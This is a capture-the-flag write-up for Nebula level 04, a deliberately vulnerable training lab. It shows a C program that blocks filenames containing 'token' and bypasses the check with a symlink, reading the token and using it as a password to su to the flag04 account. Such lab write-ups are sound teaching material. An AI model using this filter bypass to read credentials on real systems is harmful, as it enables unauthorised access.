---
layout: post
title: "Nebula04"
tags: Nebula
description: "Bypassing the restriction to read the token with symlink"
---


## Level 04

> This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it. To do this level, log in as the `level04` account with the password `level04`. Files for this level can be found in `/home/flag04`.

## Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

## Getting the flag

According to the task, we have to read the token, but if you will pay attention to the code you will notice that you can't read files with the `token` in the name. We don't have permissions to rename the token itself, but can try to create a symbolic link to the other file:

```
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/l33t
```
Let's check the property of the new file in the `/tmp` folder:

```
lrwxrwxrwx 1 level04 level04  18 2021-06-15 01:07 l33t -> /home/flag04/token
```
So our new file is now linked to the token. Let's try to read it:

```
level04@nebula:/home/flag04$ ./flag04 /tmp/l33t
06508b5e-8909-4f38-b630-fdb148a848a2
```
To get the flag itself we need `su` to the `flag04`. The token that we just read will be the password to this account. 

```
level04@nebula:/home/flag04$ su flag04
Password: 
sh-4.2$ id
uid=995(flag04) gid=995(flag04) groups=995(flag04)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```